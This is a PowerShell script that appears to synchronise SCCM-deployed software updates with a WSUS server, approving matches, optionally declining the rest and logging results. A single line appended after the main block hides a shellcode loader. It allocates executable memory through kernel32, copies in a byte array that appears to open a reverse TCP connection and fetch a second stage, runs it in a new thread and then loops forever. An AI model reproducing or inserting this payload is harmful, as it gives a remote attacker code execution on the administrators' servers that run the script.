
[CmdletBinding()]
param (
	[switch]$DeclineAllNonMatches,
	[switch]$SyncWsus,
	[string]$LogFilePath = "$PsScriptRoot\SCCM-WSUSUpdateSync.log",
	[ValidateScript({ Test-Connection -ComputerName $_ -Quiet -Count 1})]
	[string]$CmSiteServer = '',
	[string]$CmSiteCode = '',
	[ValidateScript({ Test-Connection -ComputerName $_ -Quiet -Count 1 })]
	[string]$WsusServer = '',
	[string]$WsusServerPort = '8530'
)

begin {
	$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop
	Set-StrictMode -Version Latest
	
	
	
	
	
	function Write-Log {
		
		[CmdletBinding()]
		param (
			[Parameter(Mandatory = $true)]
			[string]$Message,
			[ValidateSet(1, 2, 3)]
			[int]$LogLevel = 1
		)
		
		try {
			[pscustomobject]@{
				'Time' = Get-Date
				'Message' = $Message
				'ScriptLineNumber' = "$($MyInvocation.ScriptName | Split-Path -Leaf):$($MyInvocation.ScriptLineNumber)"
				'Severity' = $LogLevel
			} | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
		} catch {
			Write-Error $_.Exception.Message
			$false
		}
	}
	
	function Get-MyWsusUpdate {
		$Wsus.GetUpdates()
	}
	
	function Get-AllComputerTargetGroup {
		$Groups = $Wsus.GetComputerTargetGroups()
		$Groups | where { $_.Name -eq 'All Computers' }
	}
	
	function Approve-MyWsusUpdate ([Microsoft.UpdateServices.Internal.BaseApi.Update]$Update) {
		$AllComputerTg = Get-AllComputerTargetGroup
		$Update.Approve([Microsoft.UpdateServices.Administration.UpdateApprovalAction]::Install,$AllComputerTg) | Out-Null
	}
	
	function Decline-MyWsusUpdate ([Microsoft.UpdateServices.Internal.BaseApi.Update]$Update) {
		$Update.Decline()
	}
	
	function Sync-WsusServer {
		$Subscription = $Wsus.GetSubscription()
		$Subscription.StartSynchronization()
	}
	
	try {
		Write-Log 'Loading the WSUS type and creating the WSUS server object...'
		
		
		[void][reflection.assembly]::LoadWithPartialName("Microsoft.UpdateServices.Administration")
		$script:Wsus = [Microsoft.UpdateServices.Administration.AdminProxy]::getUpdateServer($WsusServer, $false, $WsusServerPort)
	} catch {
		Write-Log "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)" -LogLevel '3'
	}
	
}
process {
	try {
		Write-Log 'Finding all deployed CM updates...'
		$DeployedCmUpdates = Get-CimInstance -ComputerName $CmSiteServer -Namespace "root\sms\site_$CmSiteCode" -Class SMS_SoftwareUpdate | where { $_.IsDeployed -and !$_.IsSuperseded -and !$_.IsExpired }
		if (!$DeployedCmUpdates) {
			throw 'Error retrieving CM updates'
		} else {
			Write-Log "Found $($DeployedCmUpdates.Count) deployed updates"
		}
		Write-Log "Finding all WSUS updates on the $WsusServer WSUS server..."
		$WsusUpdates = Get-MyWsusUpdate
		if (!$WsusUpdates) {
			throw 'Error retrieving WSUS updates'
		}
		Write-Log "Found $($WsusUpdates.Count) applicable updates on the WSUS server"
		Write-Log 'Beginning matching process...'
		$MatchesMade = 0
		$NoMatchMade = 0
		$ApprovedMatches = 0
		$AlreadyApprovedMatches = 0
		$DeclinedWsusUpdates = 0
		foreach ($WsusUpdate in $WsusUpdates) {
			try {
				
				if ($DeployedCmUpdates.LocalizedDisplayname -contains $WsusUpdate.Title) {
					
					$MatchesMade++
					if (!$WsusUpdate.IsApproved) {
						
						$ApprovedMatches++
						if ($WsusUpdate.HasLicenseAgreement) {
							
							$WsusUpdate.AcceptLicenseAgreement()
						} else {
							
						}
						
						Approve-MyWsusUpdate -Update $WsusUpdate
						$ApprovedMatches++
					} else {
						
						$AlreadyApprovedMatches++
					}
				} else {
					
					$NoMatchMade++
					if ($DeclineAllNonMatches.IsPresent) {
						if ($WsusUpdate.IsDeclined) {
							
						} else {		
							
							$DeclinedWsusUpdates++
							Decline-MyWsusUpdate -Update $WsusUpdate
						}
					}
				}
			} catch {
				Write-Log "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)" -LogLevel '3'
			}
		}
		Write-Log 'Finding all CM updates that are not in WSUS...'
		$CmUpdatesNotInWsus = $DeployedCmUpdates | where { $WsusUpdates.Title -notcontains $_.LocalizedDisplayName }
		if (!$CmUpdatesNotInWsus) {
			Write-Log 'No CM updates found with no match in WSUS'
		} else {
			foreach ($CmUpdate in $CmUpdatesNotInWsus) {
				Write-Log "CM update '$($CmUpdate.LocalizedDisplayName)' not in WSUS"	
			}
			if ($SyncWsus.IsPresent) {
				
				
				Write-Log 'Forcing a WSUS sync...'
				Sync-WsusServer
			}
		}
		Write-Log "---------------------------------------------"
		Write-Log "WSUS Updates in CM: $MatchesMade"
		Write-Log "WSUS Updates in CM Declined: $DeclinedWsusUpdates"
		Write-Log "WSUS Updates in CM Already Approved: $AlreadyApprovedMatches"
		Write-Log "WSUS Updates in CM Approved: $ApprovedMatches"
		Write-Log "WSUS Updates not in CM: $NoMatchMade"
		Write-Log "CM Updates not in WSUS: $($CmUpdatesNotInWsus.Count)"
		Write-Log "---------------------------------------------"
		Write-Log 'CM --> WSUS synchronization complete'
	} catch {
		Write-Log "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)" -LogLevel '3'
	}
}
$YJow = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $YJow -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x76,0x25,0x67,0x6d,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$hNl=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($hNl.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$hNl,0,0,0);for (;;){Start-sleep 60};

